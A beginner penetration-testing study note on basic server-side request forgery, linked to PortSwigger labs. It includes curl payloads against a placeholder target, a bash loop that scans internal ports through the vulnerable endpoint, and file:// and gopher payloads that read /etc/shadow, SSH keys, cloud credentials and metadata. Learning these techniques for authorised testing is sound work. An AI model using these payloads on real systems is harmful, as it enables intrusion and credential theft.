---
tags: [vapt, ssrf, beginner]
difficulty: beginner
module: "13 - SSRF"
topic: "13.02 Basic SSRF — Fetching Internal URLs"
portswigger_labs: ["Basic SSRF against the local server", "Basic SSRF against another back-end system"]
---

# 13.02 — Basic SSRF: Fetching Internal URLs

## Attacking Localhost Services

```
LOCALHOST ATTACK:
  App runs on some server.
  Other services run on the same server: admin panels, APIs, databases.
  These services bind to 127.0.0.1 — not accessible from internet!
  
  But the APP can reach them because they're on the same machine!
  
  ATTACK:
  POST /fetch
  url=http://127.0.0.1/admin
  
  → App fetches the local admin panel
  → Returns the admin HTML to attacker!
  → Attacker now has access to admin functionality!
  
COMMON LOCALHOST SERVICES:
  127.0.0.1:80   → web app itself (internal endpoints)
  127.0.0.1:8080 → internal admin panel
  127.0.0.1:6379 → Redis
  127.0.0.1:5432 → PostgreSQL
  127.0.0.1:3306 → MySQL
  127.0.0.1:27017 → MongoDB
  127.0.0.1:9200  → Elasticsearch
  127.0.0.1:8500  → Consul
  127.0.0.1:4040  → ngrok/local tunnels
```

---

## Attacking Internal Network Services

```
INTERNAL NETWORK ATTACK:
  Companies have internal servers at 10.x.x.x or 192.168.x.x
  These are behind firewalls — you can't reach them from internet!
  
  But the TARGET SERVER is inside the company network.
  It CAN reach the internal servers.
  
  ATTACK:
  url=http://192.168.1.100/api/admin/users
  
  → App fetches from internal server
  → Returns data to attacker!
  
FINDING INTERNAL ADDRESSES:
  Common ranges:
  10.0.0.0/8      → 10.x.x.x
  172.16.0.0/12   → 172.16-31.x.x
  192.168.0.0/16  → 192.168.x.x
  
  In cloud environments:
  169.254.169.254 → AWS/GCP/Azure metadata
  172.17.0.1      → Docker bridge gateway
  100.100.100.200 → Alibaba Cloud metadata
```

---

## Step-by-Step Basic SSRF Test

```bash
# STEP 1: FIND URL INPUT:
# Look for parameters like: url=, redirect=, image=, fetch=, api=, webhook=

# STEP 2: TEST WITH SIMPLE INTERNAL URL:
# Replace the URL with localhost:
curl -X POST "https://target.com/fetch" \
  -d "url=http://127.0.0.1/"

# OR:
curl -X POST "https://target.com/fetch" \
  -d "url=http://localhost/"

# STEP 3: CHECK RESPONSE:
# Does it return content from localhost?
# Does it return a different error vs internet URL?
# "Connection refused" = port closed (but SSRF works!)
# "200 OK" with content = SUCCESS

# STEP 4: TRY INTERNAL IPs:
curl -X POST "https://target.com/fetch" \
  -d "url=http://192.168.0.1/"

# STEP 5: TRY CLOUD METADATA:
curl -X POST "https://target.com/fetch" \
  -d "url=http://169.254.169.254/latest/meta-data/"
```

---

## Reading Admin Panel via SSRF

```
PortSwigger Lab Scenario:
  1. Intercept a request with URL parameter in Burp
  2. Change URL to: http://localhost/admin
  3. Response contains the admin panel!
  4. Find the "delete user" link in the admin HTML
  5. Submit: http://localhost/admin/delete?username=carlos
  6. User deleted via SSRF!

BURP STEPS:
  1. Find request with: stockApi=https://stock.weliketoshop.net:8080/product/stock/check?productId=1
  2. Change to: stockApi=http://localhost/admin
  3. Read response → find admin functionality
  4. Change to: stockApi=http://localhost/admin/delete?username=carlos
  5. Action executes via the server!
```

---

## Internal Port Scanning via SSRF

```bash
# USE SSRF TO SCAN INTERNAL PORTS:
# If response changes between open and closed ports → can map network!

for port in 80 443 8080 8443 6379 5432 3306 27017 9200 8500 2181 9092; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 3 \
    -X POST "https://target.com/fetch" \
    -d "url=http://127.0.0.1:$port/")
  echo "Port $port: HTTP $response"
done

# INTERPRET RESULTS:
# 200          → port open, service responding!
# 000/timeout  → port closed or filtered
# 403          → port open, service refusing (still open!)
# 500          → server error processing request (interesting!)

# ALSO SCAN INTERNAL NETWORK:
for ip in 10.0.0.{1..20}; do
  result=$(curl -s --max-time 2 -X POST "https://target.com/fetch" \
    -d "url=http://$ip/")
  echo "$ip: $result"
done
```

---

## Reading Files via SSRF (file:// protocol)

```
IF APP DOESN'T RESTRICT PROTOCOLS:

file:// protocol allows reading local files!

ATTACK:
  url=file:///etc/passwd
  url=file:///etc/shadow
  url=file:///proc/self/environ  (environment variables!)
  url=file:///proc/self/cmdline  (process command line)
  url=file:///var/www/html/config.php
  url=file:///home/ubuntu/.ssh/id_rsa
  url=file:///root/.aws/credentials

WINDOWS TARGETS:
  url=file:///C:/Windows/win.ini
  url=file:///C:/inetpub/wwwroot/web.config
  url=file:///C:/Windows/System32/drivers/etc/hosts

NOTE:
  Most modern apps restrict file:// protocol.
  But always worth trying!
  See note 13 for more protocol smuggling techniques.
```

---

## Basic SSRF Test Checklist

```
QUICK SSRF TEST PAYLOADS:
  http://127.0.0.1/
  http://localhost/
  http://[::1]/         (IPv6 localhost)
  http://0.0.0.0/       (SSRF bypass for some filters)
  http://169.254.169.254/ (cloud metadata!)
  http://10.0.0.1/
  http://192.168.1.1/
  file:///etc/passwd
  gopher://localhost:6379/_PING%0d%0a  (Redis SSRF)

SIGNS OF SSRF:
  ✓ Response contains internal service data
  ✓ Different error messages for existing vs non-existing hosts
  ✓ Response time difference (internal = fast, external = slow)
  ✓ Out-of-band DNS/HTTP ping received (blind SSRF)
  ✓ App returns different status codes based on URL validity
```

---

## Related Notes
- [[01 - What is SSRF]] — fundamentals
- [[03 - SSRF via URL Parameters]] — finding URL params
- [[09 - SSRF Cloud Metadata AWS]] — cloud credentials
- [[11 - SSRF Internal Port Scanning]] — detailed port scan
- [[14 - SSRF Localhost Bypass]] — bypassing 127.0.0.1 filters
